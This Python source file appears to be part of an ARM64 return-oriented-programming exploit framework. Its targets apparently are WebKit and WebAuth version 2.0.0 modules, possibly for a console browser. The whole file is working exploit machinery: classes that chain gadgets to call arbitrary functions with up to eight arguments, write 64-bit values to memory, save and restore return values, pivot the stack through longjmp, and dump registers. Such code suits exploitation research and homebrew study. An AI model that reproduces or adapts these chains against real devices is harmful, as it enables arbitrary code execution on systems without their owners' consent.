from targets.base_200_wk import Gadgets200Wk, Functions200Wk
from targets.base_200_webauth import Gadgets200Webauth, Functions200Webauth, Dataptrs200Webauth
from targets.base_rop import BaseRop

from util import u64, isint
from relocatable import data_base, Relocatable

import struct


class Gadgets(Gadgets200Wk, Gadgets200Webauth):
    pass


class Functions(Functions200Wk, Functions200Webauth):
    pass


class Dataptrs(Dataptrs200Webauth):
    pass


class Rop(BaseRop):

    G = Gadgets()
    F = Functions()
    D = Dataptrs()

    # Utility functions, these do not modify the chain
    # 0x00000000000dd3cc : mov x8, x19 ; blr x9

    def _load_x8_x0_x1(self, x8, x0=0, x1=0):
        return [
            self.G.pop_0000_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0,
            self.G.ret, # x22
            x8, # x21
            x0, # x20
            x1, # x19
            0, # x29

            self.G.mov_x8_x21_mov_x0_x20_mov_x1_x19_blr_x22_pop_0000_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0,
            0, 0, 0, 0, 0, # x22, x21, x20, x19, x29
        ]

    # Ropgen functions, these do modify the chain

    def call_v8(self, func, a0=0, a1=0, a2=0, a3=0, a4=0, a5=0, a6=0, a7=0, x8=None):
        self.rop += self._load_x8_x0_x1(self.G.pop_0000_x22_x21_x20_x19_x29_x30)
        self.rop += [
            self.G.pop_00000000_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0, 0, 0, 0,
            0, # x28
            0, # x27
            0, # x26
            0, # x25
            0, # x24
            a0, # x23 (x0)
            a2, # x22 (x2)
            a3, # x21 (x3)
            a4, # x20 (x4)
            a1, # x19 (x1)
            0, # x29

            self.G.load_x0_to_x4_blr_x8,
            0, 0, 0, 0, 0, 0, 0, 0, 0,

            self.G.pop_0000_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0,
            0, # x22
            a5, # x21
            a6, # x20
            a7, # x19
            0, # x29

            self.G.load_x5_to_x7_trash_stack_blr_x8,
            0, 0, 0, 0, 0, 0, 0, 0, 0,
        ]

        if x8 is not None:
            self.rop += self._load_x8_x0_x1(x8, a0, a1)
            
        self.rop += [
            self.G.pop_0000_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0,
            func, # x22
            0, 0, 0, 0, # x21, x20, x19, x29

            self.G.blr_x22_pop_0000_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0,
            0, 0, 0, 0, 0 # x22, x21, x20, x19, x29
        ]

    def call_rv4(self, func, a0, a1=0, a2=0, a3=0, a4=0):
        self.store_ret(self.scratch)
        self.rop += self._load_x8_x0_x1(self.G.pop_x29_x30)
        self.load_ret(self.scratch)
        self.rop += [
            self.G.pop_00000000_x28_x27_x26_x25_x24_x23_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0, 0, 0, 0, 0,
            0, # x28
            0, # x27
            0, # x26
            0, # x25
            0, # x24
            0, # x23 (x0)
            a2, # x22 (x2)
            a3, # x21 (x3)
            a4, # x20 (x4)
            a1, # x19 (x1)
            0, # x29

            self.G.load_x1_to_x4_blr_x8,
            0, # x29

            self.G.pop_0000_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0,
            func, # x22
            0, 0, 0, 0, # x21, x20, x19, x29

            self.G.blr_x22_pop_0000_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0,
            0, 0, 0, 0, 0 # x22, x21, x20, x19, x29
        ]

    # v: constant, r: retval, l: load
    _call_funcs = {
        "vvvvvvvv": call_v8,
        "rvvvv": call_rv4,
    }

    def write64(self, val, dst):
        self.rop += [
            self.G.pop_x20_x19_x29_x30,
            dst, # x20
            val, # x19
            0, # x29

            self.G.str_x19_x20_pop_x20_x19_x29_x30,
            0, # x20
            0, # x19
            0, # x29
        ]

    def store_ret(self, addr):
        """ Store x0 to addr """
        self.rop += [
            self.G.pop_x20_x19_x29_x30,
            0, # x20
            addr, # x19
            0, # x29

            self.G.str_x0_x19_pop_x21_0_x20_x19_x29_x30,
            0, 0, 0, 0, 0, # x21, 0, x20, x19, x29
        ]

    def load_ret(self, addr):
        """ Load x0 from addr """
        self.rop += [
            self.G.pop_x20_x19_x29_x30,
            0, # x20
            addr, # x19
            0, # x29

            self.G.ldr_x0_x19_pop_x21_0_x20_x19_x29_x30,
            0, 0, 0, 0, 0,  # x21, 0, x20, x19, x29
        ]

    def infloop(self):
        self.rop += [
            self.G.infloop
        ]

    def jmp(self, new_stack):
        self.write64(new_stack, data_base+32-0x10000 + 0xF8) # SP
        self.write64(self.G.pop_x29_x30, data_base+32-0x10000 + 0x100) # X30
        self.call(self.F.longjmp, data_base+32-0x10000)

    def dump_regs(self, ptr, and_store_r0=None):
        if and_store_r0 is not None:
            self.store_ret(and_store_r0) # we can do this because it will only corrupt scratch regs in this rop impl

        # we are trying very hard to only use scratch regs here
        buf = ptr # where we place jmp_buf
        pbuf = ptr # need this to load to x0 in a weird way
        self.write64(buf, pbuf)
        self.load_ret(pbuf) # load buf to x0
        # ok now call setjmp but we can't use generic caller since it'd corrupt regs
        self.rop += [
            self.G.pop_0000_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0,
            self.F.setjmp, # x22
            0, 0, 0, 0, # x21, x20, x19, x29

            self.G.blr_x22_pop_0000_x22_x21_x20_x19_x29_x30,
            0, 0, 0, 0,
            0, 0, 0, 0, 0 # x22, x21, x20, x19, x29
        ]
